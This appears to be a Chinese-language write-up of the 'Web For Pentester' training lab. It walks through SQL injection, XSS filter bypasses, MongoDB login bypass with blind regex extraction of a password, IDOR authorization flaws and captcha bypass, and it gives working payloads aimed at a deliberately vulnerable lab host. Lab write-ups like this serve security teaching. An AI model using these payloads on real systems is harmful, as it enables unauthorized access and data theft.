<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6-4.png" alt="6-4"></p>
<p>七、Example 7</p>
<p>7.1 源代码</p>
<p>代码只确保了id参数都以一个数字开头和结尾。但是代码中的正则表达式中有一个修饰符/m，这个符号就是说在几行数据中如果有一行符合正则表达式，那么这行就被匹配到了。所以可以考虑使用换行符，\n的URL编码为%0a</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-1.png" alt="7-1"></p>
<p>7.2 报错</p>
<pre><code>?id=2 and 1=1
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-2.png" alt="7-2"></p>
<p>7.3 利用%0a</p>
<pre><code>?id=2%0aand 1=1
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-3.png" alt="7-3"></p>
<p>7.4</p>
<pre><code>?id=2%0aand 1=2
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-4.png" alt="7-4"></p>
<p>7.5 </p>
<pre><code>?id=2%0aunion select user(),2,3,4,5 %23
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7-5.png" alt="7-5"></p>
<p>八、Example 8</p>
<p>8.1 源代码</p>
<p>使用了mysql_real_escape_string()函数对参数进行过滤</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-1.png" alt="8-1"></p>
<p>8.2 </p>
<p>8.3</p>
<p>有两种方法可以在Order by语句后面加一个值，一是直接加，如Order by name；二是在反引号中加，如Order by <code>name</code>。反引号`的作用是可以使用mysql预留的Keyword。Order by语句后面接的值不能在单引号’和或者双引号“中。</p>
<p>（1）</p>
<pre><code>?order=name`%23
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-3-1.png" alt="8-3-1"></p>
<p>（2）ASC表示升序</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-3-2.png" alt="8-3-2"></p>
<p>（3）DESC表示降序</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-3-3.png" alt="8-3-3"></p>
<p>8.4</p>
<p>还可以利用别的方式来达到这个目的，如可以直接发送注入请求不用反引号。我们还可以用Mysql if语句来构造更多的攻击语句</p>
<pre><code>?order=name`,if(1=1,1,(select table_name from information_schema.tables));%23
</code></pre><p>此时执行的SQL语句是：</p>
<pre><code>select * from users order by `name`,if(1=1,1,(select table_name from information_schema.tables));#`
</code></pre><p>得到的参数为name时相同的结果</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8-4.png" alt="8-4"></p>
<p>九、Example 9</p>
<p>9.1 源代码</p>
<p>代码中去掉了反引号`的限制 。上一个例子的payload值仍然可以使用，只不过需要去掉name后面的反引号</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/9-1.png" alt="9-1"></p>
<hr>
<h1 id="（八）XSS攻击"><a href="#（八）XSS攻击" class="headerlink" title="（八）XSS攻击"></a>（八）XSS攻击</h1><h2 id="【原理】-7"><a href="#【原理】-7" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）跨站脚本（XSS）的产生是由于信息被发送到用户的时候没有被正确编码。XSS可以被用来注入任意的HTML和JavaScript代码，结果就是XSS的payload运行在合法用户的浏览器中。和其他类型的攻击不同的是，XSS是针对用户，而不是直接针对服务器</p>
<p>（2）XSS大概的流程一般是：注入一个虚假的登录框；接受合法用户的cookies；注入浏览器；让用户在web应用中执行代码</p>
<p>（3）有三种类型的XSS：</p>
<ul>
<li>反射型：payload直接在响应中出现</li>
<li>存储型：响应也会直接在响应中，但是更重要的是，当返回原页面或访问其他的页面的时候，payload还是会出现在响应中。这是因为payload被存在了应用程序的数据库中。典型的例子就是留言板中插入XSS</li>
<li>DOM型：payload不会在响应中出现，但是当浏览器渲染页面的时候，payload就会被执行</li>
</ul>
<p>（4）测试XSS的时候，应该赌侠返回的HTML代码，不能坐等alert窗口弹出来。检查哪些字符被编码了，而那些字符没有被编码。由此可能发现一个能工作的payload</p>
<p>（5）一些浏览器有一些自带的保护措施在一定程度上可以用来抵抗XSS。这个抵抗功能可以被服务器禁用或者开启。如果发现payload在返回页面中出现了，但是并没有执行，那就有可能是这个抵抗功能发生作用了。这时可以关闭这种保护功能【步骤】</p>
<p>一、Example 1</p>
<p>1.1 源代码</p>
<p>没有对payload有任何的过滤或者编码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
<p>1.2 payload默认为hacker</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
<p>1.3 因为没有任何过滤或者编码，所以直接进行XSS攻击</p>
<pre><code>?name=&lt;script&gt;alert(&#39;simpleware&#39;);&lt;/script&gt;
</code></pre><p>弹出simpleware</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/1-3.png" alt="1-3"></p>
<p>二、Example 2</p>
<p>2.1 源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
<p>2.2 preg_replace()函数进行过滤，所以上面的payload会以名字返回，而不是弹框</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
<p>2.3 因为只对小写进行过滤，我们就可以用大写（首字母）进行绕过</p>
<pre><code>?name=&lt;Script&gt;alert(&#39;simpleware&#39;)&lt;/Script&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
<p>三、Example 3</p>
<p>3.1 源代码</p>
<p>比Example2的源代码多了一个i，表示对前面的正则表达式区分大小写</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/3-1.png" alt="3-1"></p>
<p>3.2 此时若还是使用之前的首字母大写payload，会以名字形式返回</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/3-2.png" alt="3-2"></p>
<p>3.3 嵌套的script标签绕过过滤</p>
<pre><code>?name=Penterter&lt;script&gt;Lab
</code></pre><p>输出PenterterLab，说明使用嵌套的script标签绕过过滤是可行的</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
<p>3.4 双写绕过</p>
<p>因为只用了一次preg_replace()，其实也就是双写</p>
<pre><code>?name=&lt;scr&lt;script&gt;ipt&gt;alert(&#39;simpleware&#39;)&lt;/scr&lt;script&gt;ipt&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/3-4.png" alt="3-4"></p>
<p>四、Example 4</p>
<p>4.1 源代码</p>
<p>条件判断，只要包含大小写的script就会一直报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/4-1.png" alt="4-1"></p>
<p>4.2 preg_match()和preg_match_all()</p>
<p>preg_match()函数匹配成功一次后就会停止匹配</p>
<p>如果要实现全部结果的匹配，则需要使用preg_match_all()函数</p>
<p>4.3 使用之前的双写payload，会报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/4-3.png" alt="4-3"></p>
<p>4.4 使用img标签绕过</p>
<p>注意：因为onerror使用了单引号，alert()函数内要使用双引号，否则会异常</p>
<pre><code>?name=&lt;img src=&#39;xipu&#39; onerror=&#39;alert(&quot;simple&quot;)&#39; /&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/4-4.png" alt="4-4"></p>
<p>4.5 常见的让Javascript绕过过滤的方法：</p>
<p>（1）&lt;a标签中有下面的这些事件：onmouseover（你需要把鼠标放到链接上才能触发payload），onmouseout，onmousermove，onclick….</p>
<p>（2）&lt;a标签中直接出现在URL中：&lt;a href=”javascript:alert(1)”…（你需要点击链接才能触发JavaScript代码，但是由于在这个例子中不能用script这个单词，所以这个方法在这个例子中实际上不能工作</p>
<p>（3）&lt;img标签中onerror事件onerror：&lt;img src=’zzzz’ onerror=’alert(1)’ /》</p>
<p>（4）&lt;div标签中有下面的事件：onmouseover（你需要把鼠标放在那个连接上才能触发payload），onmouseout，onmousemove，onclick…</p>
<p>五、Example 5</p>
<p>5.1 源代码</p>
<p>这次对alert大小写都进行了过滤</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-1.png" alt="5-1"></p>
<p>5.2 再次使用img标签就会报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-2.png" alt="5-2"></p>
<p>5.3 alert的替换方法</p>
<p>因为源码检测到有alert，会报错并停止，所以不能再使用alert()函数。此时有两种方法：</p>
<p>一是使用JavaScript中的eval和String.fromCharCode()，String.fromCharCode()函数会将一个整数编码到对应的字符中。用这个小技巧和ascii码表，可以轻易地产生字符串alert并且调用eval()函数执行它</p>
<p>二是使用JavaScript代码中的prompt、userprompt或者confirm函数，这两个函数比较少见，但是可以产生相同的效果</p>
<p>5.4 使用String.fromCharCode()函数</p>
<p>String.fromCharCode(97,108,101,114,116)相当于alert</p>
<pre><code>?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116))(&#39;simpleware&#39;)&lt;/script&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-4.png" alt="5-4"></p>
<p>5.5 </p>
<p>String.fromCharCode()函数可接受一个指定的Unicode值，然后返回一个字符串</p>
<p>5.6 使用prompt()函数</p>
<pre><code>?name=&lt;script&gt;prompt(&#39;simpleware&#39;)&lt;/script&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-6.png" alt="5-6"></p>
<p>5.7 prompt()函数</p>
<p>用于显示一个带有提示信息，并且用户可输入信息的对话框</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/5-7.png" alt="5-7"></p>
<p>六、Example 6</p>
<p>6.1 源代码</p>
<p>此代码中，发送的payload是在Javascript代码中执行的。为了实现XSS攻击，现在payload中不需要script标签了，只需要注入已完成前面的已经存在的JS代码和添加自己的payload，然后在注入点处把后面的代码用//都注释掉或者添加一些多余的代码（var $dummy=”）来把后面的代码正确关闭掉。因为直接在js环境中输出php变量，所以可以考虑通过构造js脚本进行过滤</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/6-1.png" alt="6-1"></p>
<p>6.2 构造payload</p>
<pre><code>?name=xipu&quot;;alert(&#39;simpleware&#39;)//
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/6-2.png" alt="6-2"></p>
<p>七、Example 7</p>
<p>7.1 源代码</p>
<p>与上一个例子类似，只是多使用了一个函数htmlentities()对payloads进行了html编码。因为在js环境中输出通过html编码的php变量，而htmlentities没有过滤单引号，所以可以考虑使用单引号进行绕过</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/7-1.png" alt="7-1"></p>
<p>7.2 构造payload</p>
<pre><code>?name=xipu&#39;;alert(&#39;simpleware&#39;)//
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/7-2.png" alt="7-2"></p>
<p>八、Example 8</p>
<p>8.1 源代码</p>
<p>有源码可以知道，payload都已经被合适地编码过了。不过，页面中还是存在一个XSS，为了构成表单，程序开发者使用了PHP_SELF，这个变量是受用户控制的，由于POST地址使用了当前URL，可以考虑构造当前URL地址达到XSS目的</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/8-1.png" alt="8-1"></p>
<p>8.2 构造payload</p>
<pre><code>/&quot;method=&quot;POST&quot;&gt;&lt;script&gt;alert(&#39;simple&#39;)&lt;/script&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/8-2.png" alt="8-2"></p>
<p>九、Example 9</p>
<p>9.1 源代码</p>
<p>由源码可以看出，这个例子是一个基于DOM的XSS。这个实际上是个静态网页，不过依然存在漏洞。在这个例子中，可知当前页面渲染的时候，Javascript代码用URL得到锚点（URL中#后面这一部分），并且在客户端动态地写入页面。如果使用payload当做URL的一部分，这个可以用来触发XSS漏洞。因为直接在页面输出锚点id，所以考虑构建一个带XSS的锚点到达XSS目的</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/9-1.png" alt="9-1"></p>
<p>9.2 </p>
<p>document.write()函数用于向文档写入HTML表达式或Javascript代码，将其多个参数（exp1,exp2,exp3,….）按顺序被追加到文档中。函数原型为document.write(exp1,exp2,exp3,….)。location.hash就是得到URL中从#开始的字符串。substring(1)就是得到#后的字符串</p>
<p>9.3 构造Payload</p>
<pre><code>#&lt;script&gt;alert(&#39;simpleware&#39;)&lt;/script&gt;
</code></pre><p>发现XSS攻击没有成功，因为&lt;、&gt;和单引号被URL编码了</p>
<hr>
<h1 id="（九）MongoDB"><a href="#（九）MongoDB" class="headerlink" title="（九）MongoDB"></a>（九）MongoDB</h1><h2 id="【原理】-8"><a href="#【原理】-8" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可拓展的高性能数据存储解决方案</p>
<p>（2）MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富的、最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。MoongoDB最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引</p>
<h2 id="【步骤】-7"><a href="#【步骤】-7" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
<p>1.1</p>
<p>一个登陆界面。依据以往常用的知识，我们经常使用两种方法来绕过登陆，一是构造总是真实的条件，二是正确地终止SQL查询。通过阅读一些MongoDB文档，我们知道，在MongoDB中，or 1=1会被翻译为 || 1==1，可使用//或者&lt;!-来终止查询。在Username处输入’ || 1=1 //，提交</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/1-1.png" alt="1-1"></p>
<p>1.2 登陆成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/1-2.png" alt="1-2"></p>
<p>二、Example 2</p>
<p>2.1 看到两个用户名</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-1.png" alt="2-1"></p>
<p>2.2 单击其中一个用户，只得到一个用户的界面</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-2.png" alt="2-2"></p>
<p>2.3 构造一些语句来推断admin的密码</p>
<pre><code>?search=admin&#39; &amp;&amp; this.password.match(/./)//
</code></pre><p>经过部分url编码后：</p>
<pre><code>?search=admin&#39;%20%26%26%20this.password.match(/./)//+%00
</code></pre><p>得到同样的结果，因为点.匹配除”\r \n”之外的任何单个字符</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-3.png" alt="2-3"></p>
<p>2.4</p>
<p>输入以下内容却无结果，说明猜测的密码zzzzz并不正确</p>
<pre><code>?search=admin&#39;%20%26%26%20this.password.match(/zzzzz/)//+%00
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-4.png" alt="2-4"></p>
<p>2.5</p>
<p>输入以下内容报错</p>
<pre><code>?search=admin&#39;%20%26%26%20this.passwordzz.match(/zzzzz/)//+%00
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-5.png" alt="2-5"></p>
<p>2.6</p>
<p>通过前面的实验，我们可以得到一个结论：当admin的密码匹配我们构造的正则表达式时，我们可以得到正确的结果，而不匹配的话则无结果。根据这个我们就可以进行猜测admin的密码了</p>
<p>2.7</p>
<p>在开始猜测admin的密码前，我们先介绍一点正则匹配的知识。^匹配输入字符串的开始位置。点.匹配除”\r \n”之外的任何单个字符。*匹配前面的子表达式任意次。$匹配输入字符串的结束位置。下面我们可以举例说明一下。我们假设密码为aab时，使用下面的正则表达式进行匹配，匹配结果分别为：</p>
<pre><code>/^a.*$/    匹配
/^a$/    不匹配
/^aa.*$/    匹配
/^aa$/    不匹配
/^aaa.*$/    不匹配
/^aab.*$/    匹配
/^aab$/    匹配，密码找到
</code></pre><p>2.8</p>
<p>根据这个，我们可以编写脚本来破解admin的密码，还可以使用工具Burpsuite进行爆破</p>
<hr>
<h1 id="（十）Authorization"><a href="#（十）Authorization" class="headerlink" title="（十）Authorization"></a>（十）Authorization</h1><h2 id="【原理】-9"><a href="#【原理】-9" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）授权问题在Web应用程序中是非常常见的。本实验的练习汇集了一下常见的漏洞的例子。现代的web开发框架往往保护各种注入，但不能自动顾及这类问题的自动，因为他们无法理解其背后的商业逻辑。授权问题不能真正由自动web扫描仪进行测试，因为同样的原因，这就是为什么它往往是一个很好的漏洞来源，重要的是要知道如何测试它们。下面的部分“量分配”也是一个授权问题</p>
<h2 id="【步骤】-8"><a href="#【步骤】-8" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
<p>1.1 登陆</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-1.png" alt="1-1"></p>
<p>1.2 看到两条信息</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-2.png" alt="1-2"></p>
<p>1.3 分别查看两条信息，并且把URL地址记录下来</p>
<p>分别是：</p>
<pre><code>http://vulnerable/authorization/example1/infos/1
</code></pre><pre><code>http://vulnerable/authorization/example1/infos/2
</code></pre><p>发现除了最后的数字是递增的，其他都一样</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-3-1.png" alt="1-3-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-3-2.png" alt="1-3-2"></p>
<p>1.4 点击Logout退出登录</p>
<p>退出登陆后，在任意一个地方输入Confidential的URL，会发现直接访问Confidential的信息，不需要在经过用户名密码登录</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-4-1.png" alt="1-4-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-4-2.png" alt="1-4-2"></p>
<p>二、Example 2</p>
<p>2.1 同样的用提供的账号密码登录，看到两条信息</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/2-1.png" alt="2-1"></p>
<p>2.2 分别点击两个信息，观察URL，按照递增输入3，进入user2的内容</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/2-2.png" alt="2-2"></p>
<p>2.3 继续递增到4也可以看到新的内容</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/2-3.png" alt="2-3"></p>
<p>三、Example 3</p>
<p>3.1 同样的用提供的账号密码登录，看到两条信息</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/3-1.png" alt="3-1"></p>
<p>3.2 分别点击2条信息，其URL还是递增的，但是已经无法修改而访问，但是多了”Edit this info”，点击得到如下页面</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/3-2.png" alt="3-2"></p>
<p>3.3 修改URL数字1为2，直接访问user1(2)的编辑信息界面</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/3-3.png" alt="3-3"></p>
<p>3.4 修改为3，跳转到user2的内容编辑页面</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/3-4.png" alt="3-4"></p>
<hr>
<h1 id="（十一）Captcha"><a href="#（十一）Captcha" class="headerlink" title="（十一）Captcha"></a>（十一）Captcha</h1><h2 id="【原理】-10"><a href="#【原理】-10" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）关于captcha的验证，有各种各样的captcha bypass方式</p>
<h2 id="【步骤】-9"><a href="#【步骤】-9" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
<p>1.1 验证码，想办法绕过</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-1.png" alt="1-1"></p>
<p>1.2 输入验证码，提交，使用Burpsuite拦截</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-2.png" alt="1-2"></p>
<p>1.3 直接删去captcha及其参数，得到响应吗 200，绕过成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-3.png" alt="1-3"></p>
<p>1.4 单击右键，选择”Request in browser” - “in original session”</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-4.png" alt="1-4"></p>
<p>1.5 单击”copy”</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-5.png" alt="1-5"></p>
<p>1.6 在浏览器粘贴刚才复制的网站，单击”Repeat request”</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-6.png" alt="1-6"></p>
<p>1.7 可以看到在浏览器完成我们操作的请求，返回”Success!!!”</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-7.png" alt="1-7"></p>
<p>二、Example 2</p>
<p>2.1 captcha参数换成answer，操作和Example1一样，不赘述</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/2-1.png" alt="2-1"></p>
<p>三、Example 3</p>
<p>3.1 多了一条cookie信息</p>
<p>发现Request信息中多了一条cookie信息，发现其值其实就是验证码的值，将URL中的captcha的值改为cookie的值，成功绕过captcha验证，登陆成功</p>
